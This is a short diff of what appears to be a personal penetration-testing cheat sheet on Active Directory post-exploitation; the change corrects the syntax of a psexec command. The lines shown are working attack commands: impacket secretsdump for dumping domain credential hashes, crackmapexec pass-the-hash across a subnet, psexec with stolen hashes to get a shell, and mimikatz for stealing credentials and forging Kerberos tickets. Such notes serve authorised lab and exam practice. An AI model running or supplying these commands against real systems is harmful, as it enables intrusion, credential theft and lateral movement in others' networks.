@@ -88,7 +88,7 @@ Transfer loot back to kali:
 1. `impacket-secretsdump <username>:<password>@<domain name or IP> -dc-ip <DC IP>`
 2. or `secretsdump.py marvel/ID:SOMEPASSWORD@TARGETIP` eg `python /opt/impacket/examples/secretsdump.py offsec/Allison:'RockYou!'@192.168.125.59 `
 3. `crackmapexec smb 192.168.57.0/24 -u "Frank Admin" -H <Second part of the HASH without ::> --local-auth` (we are trying to login to other computers)
-4. If we pawned a PC, we can try to psexec into the PC. `psexec.py "Frank Admin":TARGETIP -hashes avbcd:abcd`. If dont get a shell, we werent able to gain admin access. Maybe RDP is open?. We can still do Kerbroasting.
+4. If we pawned a PC, we can try to psexec into the PC. `psexec.py "Frank Admin":@TARGETIP -hashes avbcd:abcd`. If dont get a shell, we werent able to gain admin access. Maybe RDP is open?. We can still do Kerbroasting.
 ## Dumping Hash (as Admin) 
 1. Use mimikatz to view, steal credentials, generate kerbros tickets and leverage attack.
 2. `.\mimikatz.exe`
